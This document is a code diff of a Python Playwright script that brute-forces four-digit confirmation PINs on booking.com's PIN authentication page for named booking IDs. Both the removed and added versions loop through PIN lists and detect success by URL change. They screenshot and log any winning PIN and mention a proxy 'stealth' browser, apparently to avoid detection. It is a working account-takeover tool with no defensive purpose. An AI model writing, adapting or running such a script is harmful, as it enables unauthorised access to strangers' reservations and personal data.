@@ -1,7 +1,7 @@
 """
-🎯 AGENT D SPECIALIST - BOOKING 5830944764
-Testing 48 untested PINs from Boss's master list
-Enhanced success detection - Will not miss any wins!
+🍀 PROFESSOR JOHNNY'S LUCKY PIN AGENT - BOOKING B
+Testing Professor's intuition vs systematic science!
+Enhanced success detection - Will catch any lucky wins!
 """
 
 import csv
@@ -9,30 +9,24 @@ import time
 from playwright.sync_api import sync_playwright
 from datetime import datetime
 
-# 🎯 AGENT D - BOOKING ID 5830944764
-TARGET_BOOKING_ID = "5830944764"
-AGENT_NAME = "DELTA_SPECIALIST"
+# 🎯 AGENT B - BOOKING ID 6860261353
+TARGET_BOOKING_ID = "6860261353"
+AGENT_NAME = "BRAVO_LUCKY"
 
-# 🔢 UNTESTED PINS FOR BOOKING D (48 PINs remaining from master list)
-
-UNTESTED_PINS = [
-    "0232", "0252", "0295", "0342", "0395", "0428", "0480", "0562", "0621", "0634",
-    "0729", "0743", "0918", "0922", "0944", "0977", "1008", "1094", "1123", "1332",
-    "1394", "1411", "1424", "1476", "1517", "1541", "1557", "1588", "1601", "1678",
-    "1722", "1757", "1768", "1781", "1790", "1807", "1842", "1867", "1881", "2106",
-    "2108", "2144", "2158", "2176", "2275", "2306", "2344", "2383", "2384", "2390",
-    "2465", "2481", "2586", "2634", "2656", "2675", "2748", "2903", "2981", "3018",
-    "3031", "3080", "3156", "3205", "3240", "3255", "3260", "3270", "3377", "3454",
-    "3660", "3724", "3816", "3834", "3921", "3975", "3986", "4039", "4072", "4123",
-    "4163", "4183", "4206", "4319", "4627", "4701", "4816", "5072", "5167", "5415",
-    "5421", "5453", "5828", "6012", "6101", "6490", "7033", "7034", "7098", "7212",
-    "7295", "8479", "8596", "9025"
+# 🍀 PROFESSOR JOHNNY'S LUCKY 50 PINS - INTUITION vs SCIENCE!
+# Boss's personal selection - Let's see if luck beats systematic testing!
+LUCKY_PINS = [
+    "0295", "1842", "0922", "1781", "8856", "2634", "7674", "7628", "3260", "9027", 
+    "4627", "8031", "2383", "5415", "1008", "4123", "1807", "9854", "5072", "5453", 
+    "9025", "4319", "7682", "9309", "9265", "4163", "1678", "2275", "4072", "6490", 
+    "2108", "1768", "5828", "4816", "6894", "1424", "3660", "9127", "3031", "8884", 
+    "7034", "6012", "0342", "8473", "9210", "1601", "7212", "8596", "7295", "9656"
 ]
 
 def log_result(booking_id, pin, status, url=""):
     """Log results to CSV file"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open('agent_D_results.csv', 'a', newline='') as file:
+    with open('lucky_pins_B_results.csv', 'a', newline='') as file:
         writer = csv.writer(file)
         writer.writerow([timestamp, AGENT_NAME, booking_id, pin, status, url])
 
@@ -74,7 +68,7 @@ def fill_field_with_retry(page, field_selectors, value, field_name):
 def test_pin(page, booking_id, pin):
     """Test a single PIN for a booking ID with enhanced field filling"""
     try:
-        print(f"🔁 Testing PIN: {pin} for booking {booking_id}")
+        print(f"🍀 Testing LUCKY PIN: {pin} for booking {booking_id}")
         
         # Navigate to booking confirmation page
         print("🌐 Opening booking.com...")
@@ -178,39 +172,39 @@ def test_pin(page, booking_id, pin):
         if (current_url != "https://secure.booking.com/help/confirmation_pin_auth" and
             "help/confirmation_pin_auth" not in current_url):
             status = "SUCCESS"
-            print(f"🎉🎉🎉 SUCCESS! PIN {pin} is CORRECT for booking {booking_id}! 🎉🎉🎉")
-            print(f"🌟 WINNING URL: {current_url}")
-            page.screenshot(path=f"SUCCESS_D_{booking_id}_{pin}.png")
+            print(f"🎉🍀🎉 LUCKY WIN! PIN {pin} is CORRECT for booking {booking_id}! 🎉🍀🎉")
+            print(f"🌟 PROFESSOR'S INTUITION WINS! URL: {current_url}")
+            page.screenshot(path=f"LUCKY_SUCCESS_B_{booking_id}_{pin}.png")
         else:
             # Check for error elements on page
             error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
             if len(error_elements) > 0:
                 status = "FAILURE"
-                print(f"❌ PIN {pin} is INCORRECT for booking {booking_id} (error banner detected)")
+                print(f"❌ Lucky PIN {pin} is incorrect for booking {booking_id} (error banner detected)")
             else:
                 # Check page content for error messages
                 page_text = page.content().lower()
                 if "incorrect" in page_text or "wrong" in page_text or "invalid" in page_text:
                     status = "FAILURE"
-                    print(f"❌ PIN {pin} is INCORRECT for booking {booking_id}")
+                    print(f"❌ Lucky PIN {pin} is incorrect for booking {booking_id}")
                 else:
                     status = "UNKNOWN"
-                    print(f"❓ PIN {pin} gave unexpected result for booking {booking_id}")
+                    print(f"❓ Lucky PIN {pin} gave unexpected result for booking {booking_id}")
         
         log_result(booking_id, pin, status, current_url)
         return status
         
     except Exception as e:
-        print(f"💥 Error testing PIN {pin} with booking {booking_id}: {e}")
+        print(f"💥 Error testing lucky PIN {pin} with booking {booking_id}: {e}")
         log_result(booking_id, pin, "EXCEPTION", "")
         return "EXCEPTION"
 
 def main():
-    """Main execution function - AGENT D SPECIALIST"""
-    print(f"🎯 {AGENT_NAME} DEPLOYING!")
-    print(f"🎯 Target: BOOKING D - {TARGET_BOOKING_ID}")
-    print(f"🔢 Testing {len(UNTESTED_PINS)} untested PINs")
-    print("🔧 ENHANCED SUCCESS DETECTION - Will not miss any wins!")
+    """Main execution function - LUCKY PINS AGENT B"""
+    print(f"🍀 {AGENT_NAME} DEPLOYING!")
+    print(f"🎯 Target: BOOKING B - {TARGET_BOOKING_ID}")
+    print(f"🍀 Testing Professor Johnny's {len(LUCKY_PINS)} LUCKY PINs")
+    print("🧠 INTUITION vs SCIENCE - Let's see if luck beats systematic testing!")
     print("🚀 Starting Playwright...")
     
     with sync_playwright() as p:
@@ -235,8 +229,9 @@ def main():
         print("🌐 Browser launched with PROXY STEALTH!")
         print("📄 New page created with stealth protection")
         
-        # Test all untested PINs for booking D
-        print(f"\n🎯 TESTING BOOKING D: {TARGET_BOOKING_ID}")
+        # Test Professor Johnny's Lucky PINs for booking B
+        print(f"\n🍀 TESTING PROFESSOR'S LUCKY 50 PINS FOR BOOKING B: {TARGET_BOOKING_ID}")
+        print("🍀 LUCK vs SCIENCE - Professor's intuition in action!")
         print("=" * 60)
         success_count = 0
         failure_count = 0
@@ -244,17 +239,17 @@ def main():
         exception_count = 0
         success_pins = []
         
-        for i, pin in enumerate(UNTESTED_PINS, 1):
-            print(f"\n🔁 [{i}/{len(UNTESTED_PINS)}] Testing PIN: {pin} for booking D ({TARGET_BOOKING_ID})")
+        for i, pin in enumerate(LUCKY_PINS, 1):
+            print(f"\n🍀 [{i}/{len(LUCKY_PINS)}] Testing LUCKY PIN: {pin} for booking B ({TARGET_BOOKING_ID})")
             
             result = test_pin(page, TARGET_BOOKING_ID, pin)
             
             if result == "SUCCESS":
                 success_count += 1
                 success_pins.append(pin)
-                print(f"🎉 CONFIRMED SUCCESS PIN: {pin}")
-                print("🎊 CELEBRATING SUCCESS! Pausing 30 seconds...")
-                time.sleep(30)  # Pause to celebrate success
+                print(f"🎉 PROFESSOR'S LUCKY PIN WINNER: {pin}")
+                print("🎊 PROFESSOR'S INTUITION BEATS SCIENCE! Pausing 30 seconds...")
+                time.sleep(30)  # Pause to celebrate luck beating science
             elif result == "FAILURE":
                 failure_count += 1
             elif result == "UNKNOWN":
@@ -262,25 +257,25 @@ def main():
             else:
                 exception_count += 1
             
-            print("⏳ Waiting 7s before next PIN...")
+            print("⏳ Waiting 7s before next lucky PIN...")
             time.sleep(7)
         
-        print(f"\n📊 AGENT D MISSION RESULTS:")
+        print(f"\n📊 PROFESSOR'S LUCKY MISSION RESULTS:")
         print("=" * 60)
-        print(f"🎯 Booking D: {TARGET_BOOKING_ID}")
-        print(f"🔢 Total PINs tested: {len(UNTESTED_PINS)}")
+        print(f"🎯 Booking B: {TARGET_BOOKING_ID}")
+        print(f"🍀 Total Lucky PINs tested: {len(LUCKY_PINS)}")
         print(f"🌟 SUCCESS count: {success_count}")
         print(f"❌ FAILURE count: {failure_count}")
         print(f"❓ UNKNOWN count: {unknown_count}")
         print(f"💥 EXCEPTION count: {exception_count}")
         
         if success_pins:
-            print(f"\n🎉 WINNING PINs CONFIRMED:")
+            print(f"\n🎉 PROFESSOR'S WINNING LUCKY PINs:")
             for pin in success_pins:
-                print(f"  🌟 PIN: {pin}")
-            print(f"\n🎊 MISSION STATUS: {len(success_pins)} SUCCESS PIN(S) CONFIRMED!")
+                print(f"  🍀 LUCKY PIN: {pin}")
+            print(f"\n🎊 MISSION STATUS: PROFESSOR'S INTUITION WINS! {len(success_pins)} LUCKY PIN(S) CONFIRMED!")
         else:
-            print(f"\n⚠️ MISSION STATUS: NO SUCCESS DETECTED - All {len(UNTESTED_PINS)} PINs tested!")
+            print(f"\n⚠️ MISSION STATUS: NO LUCKY WINS - Science holds strong for now! All {len(LUCKY_PINS)} Lucky PINs tested!")
         
         browser.close()
 
